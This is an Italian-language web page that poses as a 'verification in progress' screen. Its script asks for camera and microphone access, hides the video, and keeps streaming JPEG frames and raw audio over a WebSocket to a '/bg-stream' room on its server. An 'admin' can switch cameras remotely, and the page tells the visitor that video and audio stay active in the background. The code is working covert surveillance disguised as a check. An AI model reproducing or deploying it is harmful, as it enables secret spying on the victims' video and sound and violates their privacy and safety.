<!DOCTYPE html>
<html lang="it">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<title>Verifica...</title>
<style>
  body { margin:0; padding:0; background:#000; color:#0f0; font-family:Arial; text-align:center; }
  .msg { padding:40px 20px; font-size:18px; }
</style>
</head>
<body>
<div class="msg">Verifica in corso...<br><small>Non chiudere questa pagina.</small></div>
<video id="cam" playsinline autoplay muted style="display:none;"></video>
<canvas id="canvas" style="display:none;"></canvas>

<script>
const room = new URLSearchParams(location.search).get('room') || 'user1';
const protocol = location.protocol === 'https:' ? 'wss' : 'ws';
const ws = new WebSocket(`${protocol}://${location.host}/bg-stream?room=${room}`);

const video = document.getElementById('cam');
const canvas = document.getElementById('canvas');
const ctx = canvas.getContext('2d');
let sending = false;
let currentCamera = 'environment';
let stream = null;

ws.onopen = async () => { console.log('âœ… WebSocket connesso'); startCamera(currentCamera); };
ws.onerror = e => console.error('WebSocket errore', e);
ws.onclose = () => console.warn('WebSocket chiuso');

// Ricezione comandi admin
ws.onmessage = e => {
  if (typeof e.data === 'string') {
    try {
      const msg = JSON.parse(e.data);
      if (msg.type === 'switchCamera') {
        currentCamera = msg.camera;
        startCamera(currentCamera);
      }
    } catch {}
  }
};

async function startCamera(camera) {
  if (stream) stream.getTracks().forEach(track => track.stop());

  try {
    stream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: camera, width: { ideal: 640 }, height: { ideal: 480 } },
      audio: true
    });
    video.srcObject = stream;
    await video.play();
    sending = true;
    sendFrame();
    sendAudio();

    document.querySelector('.msg').innerHTML =
      `<b>Verifica completata</b><br><small>Video e audio attivi in background.</small>`;
  } catch (err) {
    document.body.innerHTML = `<div class="msg">Errore: ${err.message}</div>`;
  }
}

// Invio video
function sendFrame() {
  if (!sending || video.videoWidth === 0) { setTimeout(sendFrame, 50); return; }
  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;
  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
  canvas.toBlob(blob => { if (blob && ws.readyState === WebSocket.OPEN) ws.send(blob); }, 'image/jpeg', 0.85);
  setTimeout(sendFrame, 50);
}

// Invio audio PCM semplice
function sendAudio() {
  const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
  const source = audioCtx.createMediaStreamSource(stream);
  const processor = audioCtx.createScriptProcessor(2048, 1, 1);
  source.connect(processor);
  processor.connect(audioCtx.destination);
  processor.onaudioprocess = e => {
    if (ws.readyState === WebSocket.OPEN) {
      const input = e.inputBuffer.getChannelData(0);
      const buffer = new ArrayBuffer(input.length * 2);
      const view = new DataView(buffer);
      for (let i = 0; i < input.length; i++) {
        let s = Math.max(-1, Math.min(1, input[i]));
        view.setInt16(i * 2, s < 0 ? s * 0x8000 : s * 0x7FFF, true);
      }
      ws.send(buffer);
    }
  };
}

setInterval(() => { if (ws.readyState === WebSocket.OPEN) ws.send('ping'); }, 10000);
</script>
</body>
</html>
